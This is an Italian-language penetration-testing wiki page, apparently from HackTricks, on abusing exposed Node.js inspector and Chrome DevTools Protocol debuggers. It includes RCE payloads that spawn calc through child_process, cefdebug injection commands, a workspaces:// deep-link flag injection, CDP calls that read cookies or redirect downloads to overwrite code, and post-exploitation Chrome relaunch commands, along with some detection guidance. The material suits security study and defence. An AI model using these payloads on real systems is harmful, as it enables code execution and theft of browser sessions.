# Abuso del debug di Node inspector/CEF

{{#include ../../banners/hacktricks-training.md}}

Esempi pratici storici includono il walkthrough Multimaster e l'attacco al debugger di Visual Studio Code CVE-2019-1414; usali come contesto specifico della versione, invece di presumere che ogni target Electron o Chromium attuale esponga le stesse primitive.<sup>[[1]](#references)[[3]](#references)</sup>

## Informazioni di base

[Dalla documentazione](https://nodejs.org/learn/getting-started/debugging): quando viene avviato con l'opzione `--inspect`, un processo Node.js resta in ascolto di un client di debug. Per **impostazione predefinita**, resta in ascolto sull'host e sulla porta **`127.0.0.1:9229`**. A ogni processo viene inoltre assegnato un **UUID** **univoco**.<sup>[[4]](#references)</sup>

I client Inspector devono conoscere e specificare l'indirizzo host, la porta e l'UUID per connettersi. Un URL completo sarà simile a `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`.<sup>[[4]](#references)</sup>

> [!WARNING]
> Poiché il **debugger ha accesso completo all'ambiente di esecuzione Node.js**, un attore malevolo in grado di connettersi a questa porta potrebbe essere in grado di eseguire codice arbitrario per conto del processo Node.js (**potenziale privilege escalation**).<sup>[[4]](#references)</sup>

Esistono diversi modi per avviare un inspector:<sup>[[4]](#references)</sup>
```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk also pauses at the start of the user script

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```
Quando avvii un processo sottoposto a ispezione, apparirà qualcosa di simile:<sup>[[4]](#references)</sup>
```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```
I processi basati su **CEF** (**Chromium Embedded Framework**) possono esporre un debugger con `--remote-debugging-port=9222`. Questo espone il browser tramite il [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) anziché tramite un inspector di Node.js, quindi i payload basati su `process` di Node.js non sono direttamente applicabili per impostazione predefinita.<sup>[[2]](#references)[[5]](#references)</sup>

Quando avvii un browser sottoposto a debug, apparirà qualcosa di simile:<sup>[[2]](#references)[[5]](#references)</sup>
```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```
### Enumerazione e controllo di un endpoint CDP

Gli endpoint HTTP di discovery distinguono il WebSocket del **browser** dai singoli WebSocket dei **target** (scheda, worker, estensione, ecc.). Interroga `/json/version` per l'endpoint del browser e `/json/list` per i target; i valori `webSocketDebuggerUrl` restituiti possono quindi essere gestiti direttamente con i messaggi JSON-RPC-like di CDP.<sup>[[5]](#references)</sup>
```bash
# Browser metadata and browser-level WebSocket
curl -s http://127.0.0.1:9222/json/version | jq

# Pages/workers and their target-level WebSockets
curl -s http://127.0.0.1:9222/json/list |
jq '.[] | {id, type, title, url, webSocketDebuggerUrl}'

BROWSER_WS=$(curl -s http://127.0.0.1:9222/json/version | jq -r .webSocketDebuggerUrl)
PAGE_WS=$(curl -s http://127.0.0.1:9222/json/list | jq -r '[.[] | select(.type=="page")][0].webSocketDebuggerUrl')
```
Ad esempio, connettiti con `websocat "$BROWSER_WS"` e invia `{"id":1,"method":"Target.getTargets"}` oppure `{"id":2,"method":"Storage.getCookies"}`. Su un page target (`websocat "$PAGE_WS"`), `Runtime.evaluate` viene eseguito in quel renderer e `Page.captureScreenshot` restituisce uno screenshot codificato in base64. `document.cookie` non può rivelare i cookie `HttpOnly`, mentre `Storage.getCookies` richiede al browser il proprio cookie store.<sup>[[5]](#references)</sup>
```json
{"id":3,"method":"Runtime.evaluate","params":{"expression":"({url:location.href,title:document.title,cookie:document.cookie})","returnByValue":true}}
{"id":4,"method":"Page.captureScreenshot","params":{"format":"png"}}
```
### Browser, WebSockets e same-origin policy <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

I siti web aperti in un web browser possono effettuare richieste WebSocket e HTTP secondo il modello di sicurezza del browser. È necessaria una **connessione HTTP iniziale** per **ottenere un ID di sessione debugger univoco**. La **same-origin-policy** **impedisce** ai siti web di effettuare **questa connessione HTTP**. Per una maggiore sicurezza contro gli [**DNS rebinding attacks**](https://en.wikipedia.org/wiki/DNS_rebinding)**,** Node.js verifica che gli **header 'Host'** della connessione specifichino un **indirizzo IP** oppure esattamente **`localhost`**.<sup>[[4]](#references)</sup>

> [!TIP]
> Questa **misura di sicurezza impedisce di sfruttare l'inspector** per eseguire codice **inviando semplicemente una richiesta HTTP** (cosa che si potrebbe fare sfruttando una vulnerabilità SSRF).<sup>[[4]](#references)</sup>

### Avvio dell'inspector nei processi in esecuzione

È possibile inviare il **segnale SIGUSR1** a un processo nodejs in esecuzione per fare in modo che **avvii l'inspector** sulla porta predefinita. Tuttavia, è necessario disporre di privilegi sufficienti, quindi ciò potrebbe concedere **accesso privilegiato alle informazioni all'interno del processo**, ma non comporta un'escalation diretta dei privilegi.<sup>[[4]](#references)</sup>
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
> [!TIP]
> Questo è utile nei container perché **arrestare il processo e avviarne uno nuovo** con `--inspect` **non è un'opzione**, poiché il **container** verrà **terminato** insieme al processo.<sup>[[6]](#references)</sup>

### Connect to inspector/debugger

Per connettersi a un **browser basato su Chromium**, è possibile accedere agli URL `chrome://inspect` o `edge://inspect` rispettivamente per Chrome o Edge. Facendo clic sul pulsante Configure, è necessario assicurarsi che **host e porta di destinazione** siano elencati correttamente. L'immagine mostra un esempio di Remote Code Execution (RCE):<sup>[[2]](#references)[[4]](#references)</sup>

![Dopo aver ottenuto un URL per accedere al debugger, questo apparirà. Ad esempio, ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d - Connect to inspector/debugger: Per connettersi a un browser basato su Chromium,...](<../../images/image (674).png>)

Utilizzando la **riga di comando** è possibile connettersi a un debugger/inspector con:<sup>[[2]](#references)[[4]](#references)</sup>
```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```
Lo strumento [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug) consente di **individuare gli inspector** in esecuzione localmente e **iniettare codice** al loro interno.<sup>[[2]](#references)</sup>
```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```
> [!TIP]
> Tieni presente che gli exploit di **RCE in NodeJS** non funzioneranno se connessi a un browser tramite [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) (devi controllare l'API per trovare operazioni interessanti da eseguire).<sup>[[2]](#references)[[5]](#references)</sup>

## RCE in NodeJS Debugger/Inspector

> [!TIP]
> Se sei arrivato qui cercando come ottenere [**RCE da una XSS in Electron, consulta questa pagina.**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/index.html)

Alcuni modi comuni per ottenere **RCE** quando puoi **connetterti** a un **inspector** di Node consistono nell'usare qualcosa di simile (a quanto pare **non funzionerà in una connessione al Chrome DevTools protocol**):<sup>[[2]](#references)</sup>
```javascript
process.mainModule.require("child_process").exec("calc")
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require("child_process").spawnSync("calc.exe")
Browser.open(JSON.stringify({ url: "c:\\windows\\system32\\calc.exe" }))
```
## Payload del Chrome DevTools Protocol

Puoi consultare l'API qui: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/).<sup>[[5]](#references)</sup>
In questa sezione elencherò semplicemente le tecniche interessanti che ho trovato e che sono state usate per sfruttare questo protocollo.

### Restrizione del profilo predefinito in Chrome 136+

A partire da **Chrome 136**, Chrome ignora `--remote-debugging-port` e `--remote-debugging-pipe` quando puntano alla **directory dati predefinita di Chrome**. Lo switch deve essere associato a un `--user-data-dir` non standard, la cui chiave di cifratura separata e lo stato isolato del browser impediscono alla semplice tecnica basata su flag di esporre il normale profilo autenticato dell'utente. Questa restrizione specifica di Chrome non deve essere considerata applicabile alle versioni precedenti di Chrome, a Chrome for Testing, alle applicazioni Electron/CEF o ad altre derivate di Chromium senza previa verifica.<sup>[[14]](#references)</sup>
```bash
# Valid current-Chrome debugging setup, but this is a new isolated profile
google-chrome --remote-debugging-port=9222 --user-data-dir=/tmp/chrome-cdp-lab
```
Pertanto, vedere un processo Chrome attuale avviato solo con `--remote-debugging-port` **non** dimostra che CDP sia diventato attivo. Confermare il listener e `/json/version`, quindi determinare quale profilo lo utilizzi effettivamente.<sup>[[14]](#references)</sup>

### Parameter Injection via Deep Links

In [**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/) Rhino security ha scoperto che un'applicazione basata su CEF **registrava una UR**I** personalizzata** nel sistema (workspaces://index.html), che riceveva l'URI completo e quindi **avviava l'applicatio**ne basata su CEF con una configurazione parzialmente costruita a partire da quell'URI.<sup>[[8]](#references)</sup>

È stato scoperto che i parametri dell'URI venivano decodificati tramite URL e utilizzati per avviare l'applicazione di base CEF, consentendo a un utente di **iniettare** il flag **`--gpu-launcher`** nella **command line** ed eseguire operazioni arbitrarie.<sup>[[8]](#references)</sup>

Quindi, un payload come:
```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```
Eseguirà calc.exe.<sup>[[8]](#references)</sup>

### Sovrascrivere i file

Modifica la cartella in cui verranno **salvati i file scaricati** e scarica un file per **sovrascrivere** il **codice sorgente** usato frequentemente dall'applicazione con il tuo **codice malevolo**.<sup>[[5]](#references)[[6]](#references)</sup>
```javascript
ws = new WebSocket(url) //URL of the chrome devtools service
ws.send(
JSON.stringify({
id: 42069,
method: "Browser.setDownloadBehavior",
params: {
behavior: "allow",
downloadPath: "/code/",
},
})
)
```
### Webdriver RCE ed esfiltrazione

STAR Labs ha dimostrato che i servizi WebDriver/CDP esposti possono consentire la lettura arbitraria di file e RCE; in alcune configurazioni, il DNS rebinding può completare la exploit chain.<sup>[[9]](#references)</sup>

Per ulteriori casi storici relativi alla browser automation e alla sicurezza di Chromium, vedere il write-up Counter WebDriver e i problemi di Project Zero 773, 1742 e 1944.<sup>[[10]](#references)[[11]](#references)[[12]](#references)[[13]](#references)</sup>

### Abilitazione di CDP all'interno di un processo Chromium attivo

Su Windows, [**CDP-Enabler**](https://github.com/deathflamingo/CDP-Enabler) ha dimostrato che la restrizione della riga di comando non è l'unico modo per attivare CDP: il codice già in grado di eseguire injection in un `msedge.exe` esistente può invocare il metodo non esportato di Chromium `content::DevToolsAgentHost::StartRemoteDebuggingServer` ed esporre il profilo live autenticato senza riavviare il browser.<sup>[[15]](#references)</sup>

La chain dimostrata esegue l'injection di una DLL con `VirtualAllocEx`/`WriteProcessMemory`/`CreateRemoteThread`, risolve i simboli interni di Edge (prima dai PDB e poi con signature di byte specifiche per la versione), crea una subclass della finestra del browser e invia un messaggio affinché la chiamata finale di avvio del server venga eseguita sul **UI thread** del browser. Il socket viene associato al loopback, dopodiché le normali primitive CDP possono recuperare cookie, acquisire tab, ispezionare il traffico di rete o valutare JavaScript in pagine autenticate.<sup>[[15]](#references)</sup>

> [!WARNING]
> Questa è una tecnica di **post-compromise/process-injection**, non un bypass di rete non autenticato. Dipende fortemente dalla build, perché i simboli C++ rilevanti non sono esportati e le signature possono cambiare dopo gli aggiornamenti del browser.<sup>[[15]](#references)</sup>

Per il rilevamento, non fare affidamento solo sulla telemetria della riga di comando `--remote-debugging-*`: correla anche handle e operazioni di memoria anomali sui processi del browser (`PROCESS_VM_OPERATION`, `PROCESS_VM_WRITE`, creazione di thread), DLL injection e socket di ascolto loopback imprevisti di proprietà di Chrome/Edge.<sup>[[15]](#references)</sup>

### Post-Exploitation

In un ambiente reale e **dopo aver compromesso** un PC utente che utilizza un browser basato su Chromium, una tecnica storica consisteva nel riavviare il browser con il debugging abilitato e inoltrare la porta loopback. Questo può esporre lo stato di navigazione della vittima sui prodotti/build che accettano ancora il profilo selezionato, ma Chrome 136+ non lo applicherà alla directory dati predefinita.<sup>[[7]](#references)[[14]](#references)</sup>

Il comando originale di riavvio è riportato di seguito per i target meno recenti o specifici di una determinata versione. Il secondo comando è la forma attualmente supportata da Chrome, ma crea un profilo isolato invece di riaprire lo stato autenticato normale della vittima.<sup>[[7]](#references)[[14]](#references)</sup>
```powershell
# Historical: verify whether the target actually honors it
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"

# Current Chrome: CDP works, but against a new profile
Start-Process "Chrome" "--remote-debugging-port=9222 --user-data-dir=$env:TEMP\chrome-cdp"
```
Per le tecniche specifiche per macOS relative al relaunch di Chromium, alle estensioni e al CDP, consulta [macOS Chromium Injection](../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-chromium-injection.md).



## References

- [1] [HackTheBox - Multimaster (IppSec)](https://www.youtube.com/watch?v=iwR746pfTEc&t=6345s)
- [2] [taviso/cefdebug - Strumento di ispezione e sfruttamento del debugger CEF/Chromium](https://github.com/taviso/cefdebug)
- [3] [CVE-2019-1414: Remote Code Execution di Visual Studio Code tramite il debugger Chrome DevTools](https://iwantmore.pizza/posts/cve-2019-1414.html)
- [4] [Guida al debugging di Node.js - Introduzione](https://nodejs.org/learn/getting-started/debugging)
- [5] [Chrome DevTools Protocol](https://chromedevtools.github.io/devtools-protocol/)
- [6] [Writeup di corCTF 2021 - saasme (Larry Yuan)](https://larry.science/post/corctf-2021/#saasme-2-solves)
- [7] [Post-Exploitation: Abusare della funzionalità di debugging di Chrome per osservare e controllare da remoto le sessioni di navigazione](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)
- [8] [CVE-2021-38112: Remote Code Execution in AWS WorkSpaces](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/)
- [9] [Stai parlando con me? - RCE di WebDriver tramite DNS Rebinding e CDP (STAR Labs)](https://starlabs.sg/blog/2021/04-you-talking-to-me/)
- [10] [Contrastare WebDriver - Da Bot a RCE](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148)
- [11] [Issue 773 di Google Project Zero (bug tracker di Chromium)](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
- [12] [Issue 1742 di Google Project Zero (bug tracker di Chromium)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
- [13] [Issue 1944 di Google Project Zero (bug tracker di Chromium)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
- [14] [Modifiche agli switch di remote debugging per migliorare la sicurezza - Chrome for Developers](https://developer.chrome.com/blog/remote-debugging-port)
- [15] [Iniettare CDP in un browser Edge in esecuzione: analisi approfondita della strumentazione runtime del browser](https://deathflamingo.com/blog/cdp_enabler/)
{{#include ../../banners/hacktricks-training.md}}
